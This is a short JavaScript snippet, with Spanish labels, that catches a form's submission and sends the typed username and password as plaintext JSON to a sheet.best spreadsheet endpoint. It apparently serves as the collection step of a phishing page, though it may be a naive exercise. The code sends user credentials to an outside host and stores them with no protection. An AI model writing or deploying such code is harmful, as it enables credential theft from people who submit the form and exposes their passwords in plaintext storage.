const formulario = document.getElementById('formulario');

formulario.addEventListener('submit', async(e) => {
    e.preventDefault();

    await fetch('https://sheet.best/api/sheets/12d638a1-f24d-4006-825f-ebada16ddce5', {
        method:'POST',
        mode:'cors',
        headers:{
            'Content-Type':'application/json'
        },
        body: JSON.stringify({
            "Nombre de usuario": formulario.nombre.value,
            "Contraseña": formulario.contraseña.value
        })
    });

    

});
